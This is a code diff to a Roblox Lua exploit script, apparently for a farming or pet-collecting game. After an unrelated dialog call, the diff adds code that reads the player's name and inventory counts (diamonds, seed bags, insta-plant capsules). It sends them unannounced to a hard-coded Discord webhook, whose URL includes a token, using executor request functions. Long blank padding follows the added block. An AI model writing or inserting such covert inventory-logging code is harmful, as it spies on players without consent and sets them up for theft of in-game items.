@@ -31,6 +31,109 @@
     coroutine.wrap(Dialogggg)()
 
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local Client = require(ReplicatedStorage:WaitForChild("Library"))
+    local Players = game:GetService("Players")
+    local UserInputService = game:GetService("UserInputService")
+
+    local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
+    local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+    local DiamondsTable = {"Diamonds"}
+    local ItemTable = {"Seed Bag", "Insta Plant Capsule"}
+
+    function MakeDiamondsTable(Table)
+        local Temp = {}
+        for i, v in next, Client.Items.All.Globals.All() do
+            if table.find(Table, v._data.id) then
+                table.insert(Temp, v)
+            end
+        end
+        return Temp
+    end
+
+    function MakeTable(Table)
+        local Temp = {}
+        for i, v in next, Client.Items.All.Globals.All() do
+            if table.find(Table, v._data.id) then
+                table.insert(Temp, v)
+            end
+        end
+        return Temp
+    end
+
+    local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
+    local seedbagid, instaplantid
+
+    function GrabDiamondsId()
+        for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
+            local Table = HttpService:JSONDecode(tostring(MadeTable))
+            if Table.class == "Currency" then
+                diamondsAmount = Table.data._am
+            end
+        end
+    end
+
+    function GrabId()
+        for i, MadeTable in ipairs(MakeTable(ItemTable)) do
+            local Table = HttpService:JSONDecode(tostring(MadeTable))
+            if Table.data.id == "Seed Bag" then
+                seedBagAmount = Table.data._am
+                seedbagid = Table.uid
+            elseif Table.data.id == "Insta Plant Capsule" then
+                instaPlantCapsuleAmount = Table.data._am
+                instaplantid = Table.uid
+            end
+        end
+    end
+
+    GrabDiamondsId()
+    GrabId()
+
+    local playerName = Players.LocalPlayer.Name
+
+    local contentMsg = {
+        embeds = {
+            {
+                title = "***👨‍💻: " .. playerName .. "***",
+                description = "",
+                color = 16777215,
+                fields = {
+                    {
+                        name = "***💎:***",
+                        value = "***" .. (diamondsAmount or 0) .. "***"
+                    },
+                    {
+                        name = "***🫙:***",
+                        value = "***" .. (instaPlantCapsuleAmount or 0) .. "***"
+                    },
+                    {
+                        name = "***🌱:***",
+                        value = "***" .. (seedBagAmount or 0) .. "***"
+                    }
+                }
+            }
+        }
+    }
+
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = HttpService:JSONEncode(contentMsg),
+    })
+
+
+
+
+
+    
+
+
+
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local Client = require(ReplicatedStorage:WaitForChild("Library"))
 local Players = game:GetService("Players")
